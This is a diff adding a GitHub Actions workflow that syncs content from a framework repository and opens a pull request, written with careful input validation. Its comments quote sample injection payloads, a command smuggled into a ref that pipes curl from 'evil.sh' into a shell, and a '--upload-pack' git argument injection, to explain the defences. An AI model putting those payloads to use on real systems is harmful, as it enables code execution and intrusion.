@@ -1,0 +1,182 @@
+name: sync
+
+# Re-vendors the reference content when the framework publishes a release.
+#
+# The framework's release.yml sends a repository_dispatch here. Until the
+# DOCS_DISPATCH_TOKEN secret exists on that side, nothing arrives and this is
+# run by hand from the Actions tab — which is also how you re-sync to an
+# arbitrary ref.
+on:
+  repository_dispatch:
+    types: [sumitsubo-release]
+  workflow_dispatch:
+    inputs:
+      ref:
+        description: 'Tag or branch in kurodaSensei/sumitsubo (e.g. v0.6.0)'
+        required: true
+        default: main
+
+# Enough to push a branch and open a PR with the built-in token. No
+# third-party action gets write access to this repository.
+permissions:
+  contents: write
+  pull-requests: write
+
+concurrency:
+  group: sync
+  cancel-in-progress: false
+
+# `shell: bash` is `bash --noprofile --norc -eo pipefail`, and the pipefail is
+# the point. The default shell has no pipefail, so `npm run sync | tee` would
+# report tee's exit status — the step passing while the sync died, and the run
+# then concluding there was nothing to do. A green tick over a dead sync.
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '24'
+          cache: npm
+
+      - run: npm ci
+
+      - name: Resolve the ref to a full sha
+        id: ref
+        env:
+          # Through the environment, never `${{ }}` inside the script. An
+          # expression is substituted into the source BEFORE bash parses it, so
+          # a payload of `v1; curl evil.sh | sh` would simply run — on a job
+          # holding `contents: write` and a token that can open pull requests.
+          # The dispatch payload comes from another repository's workflow, which
+          # is exactly the boundary not to trust.
+          RAW_REF: ${{ github.event.client_payload.ref || inputs.ref }}
+        run: |
+          REF="$RAW_REF"
+          [ -n "$REF" ] || { echo "::error::no ref given"; exit 1; }
+
+          # Belt and braces: a git ref is a conservative charset, and anything
+          # outside it is rejected rather than quoted and hoped for. The leading
+          # dash is excluded separately — `--upload-pack=…` passes a charset
+          # test and is an argument-injection into git.
+          case "$REF" in
+            -*) echo "::error::refusing a ref that starts with a dash: $REF"; exit 1 ;;
+            *[!A-Za-z0-9._/-]*) echo "::error::refusing a ref with unexpected characters: $REF"; exit 1 ;;
+          esac
+
+          echo "ref=$REF" >> "$GITHUB_OUTPUT"
+
+          # A lightweight tag has no tag object, so `^{}` resolves to nothing —
+          # the framework's release.yml creates them with plain `git tag`.
+          # Asking for both patterns covers either kind, and the peeled line
+          # wins when it exists.
+          OUT=$(git ls-remote -- https://github.com/kurodaSensei/sumitsubo.git \
+                  "refs/tags/$REF^{}" "refs/tags/$REF" "refs/heads/$REF")
+          SHA=$(echo "$OUT" | grep '\^{}$' | cut -f1 | head -1)
+          [ -n "$SHA" ] || SHA=$(echo "$OUT" | cut -f1 | head -1)
+          [ -n "$SHA" ] || { echo "::error::$REF does not exist in the framework repo"; exit 1; }
+
+          echo "sha=$SHA" >> "$GITHUB_OUTPUT"
+          echo "Resolved $REF to $SHA"
+
+      # `continue-on-error` so the guard's message can be turned into
+      # instructions instead of a red X with the reason buried in a log.
+      - name: Sync the content
+        id: sync
+        continue-on-error: true
+        env:
+          SHA: ${{ steps.ref.outputs.sha }}
+        run: npm run sync -- --ref "$SHA" 2>&1 | tee /tmp/sync.log
+
+      - name: Explain a refused sync
+        if: steps.sync.outcome == 'failure'
+        env:
+          REF: ${{ steps.ref.outputs.ref }}
+          SHA: ${{ steps.ref.outputs.sha }}
+        run: |
+          {
+            echo "## The sync refused \`$REF\`"
+            echo
+            echo '```'
+            cat /tmp/sync.log
+            echo '```'
+            echo
+            echo "This is the guard working, not a broken build. It fires when the"
+            echo "framework gained or lost a skill or command, because the site cannot"
+            echo "publish a page it has no Spanish translation for."
+            echo
+            echo "By hand, in one commit:"
+            echo
+            echo "1. \`EXPECTED\` in \`scripts/sync-framework.mjs\` to the counts above."
+            echo "2. \`npm run sync -- --ref $SHA\` — it now lists every"
+            echo "   page reported \`missing\` or \`stale\`."
+            echo "3. Write those Spanish pages under \`content/es/\`. By hand, on purpose."
+            echo "4. \`npm run check\`."
+          } >> "$GITHUB_STEP_SUMMARY"
+          exit 1
+
+      - name: Stop early when nothing moved
+        id: diff
+        env:
+          SHA: ${{ steps.ref.outputs.sha }}
+        run: |
+          # --porcelain, not `git diff --quiet`: a sync that writes a NEW page
+          # leaves it untracked, which `git diff` does not see. Today the
+          # EXPECTED guard fires before that can happen, so the distinction is
+          # theoretical — and relying on one guard to cover another is how it
+          # stops being theoretical.
+          if [ -z "$(git status --porcelain)" ]; then
+            echo "changed=false" >> "$GITHUB_OUTPUT"
+            echo "Already at $SHA — nothing to do." >> "$GITHUB_STEP_SUMMARY"
+          else
+            echo "changed=true" >> "$GITHUB_OUTPUT"
+          fi
+
+      # The PR is only worth opening if it builds. Both run here for the same
+      # reason checks.yml runs them on every push.
+      - if: steps.diff.outputs.changed == 'true'
+        run: npm run check
+
+      - if: steps.diff.outputs.changed == 'true'
+        run: npm run generate
+
+      - name: Open or update the pull request
+        if: steps.diff.outputs.changed == 'true'
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REF: ${{ steps.ref.outputs.ref }}
+          SHA: ${{ steps.ref.outputs.sha }}
+        run: |
+          BRANCH="sync/$REF"
+          git config user.name  'github-actions[bot]'
+          git config user.email 'github-actions[bot]@users.noreply.github.com'
+          git checkout -b "$BRANCH"
+          git add -A
+          git commit -m "content: sync to $REF" -m "Pinned to $SHA." \
+                     -m "Opened by .github/workflows/sync.yml."
+          git push --force-with-lease -u origin "$BRANCH"
+
+          # Re-running for the same ref should move the existing PR, not stack
+          # a second one on the same branch.
+          if [ -n "$(gh pr list --head "$BRANCH" --state open --json number --jq '.[].number')" ]; then
+            echo "Updated the open PR for $BRANCH." >> "$GITHUB_STEP_SUMMARY"
+          else
+            # Built with printf rather than a multi-line string: a continuation
+            # line at column zero closes the YAML block scalar, which is a
+            # parse error in this file rather than a wrong PR body.
+            BODY=$(printf '%s\n' \
+              "Vendored from \`$SHA\` (\`$REF\`) by \`sync.yml\`." \
+              "" \
+              "\`npm run check\` and \`npm run generate\` passed before this was opened." \
+              "" \
+              "Read the diff before merging: a translation that went stale is still" \
+              "served, marked as behind its source, and the run log says which.")
+            gh pr create --base main --head "$BRANCH" \
+              --title "content: sync to $REF" --body "$BODY"
+          fi
